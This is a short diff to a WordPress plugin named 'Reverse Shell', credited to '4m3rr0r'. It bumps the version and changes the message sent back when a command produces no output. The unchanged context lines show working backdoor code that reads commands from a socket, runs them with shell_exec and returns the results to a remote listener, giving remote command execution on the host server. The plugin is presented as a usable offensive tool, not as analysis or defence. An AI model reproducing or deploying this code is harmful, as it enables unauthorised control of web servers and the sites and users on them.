@@ -2,7 +2,7 @@
 /**
  * Plugin Name: Reverse Shell
  * Description: A plugin that provides reverse shell functionality with a hacker-style GUI for configuration.
- * Version: 1.3
+ * Version: 1.4
  * Author: 4m3rr0r
  */
 
@@ -123,7 +123,7 @@ function reverse_shell_connect($ip, $port) {
         while (!feof($sock)) {
             $cmd = fread($sock, 2048);
             $output = shell_exec($cmd);
-            fwrite($sock, $output);
+            fwrite($sock, $output ?: 'No output from command.');
         }
         fclose($sock);
     }
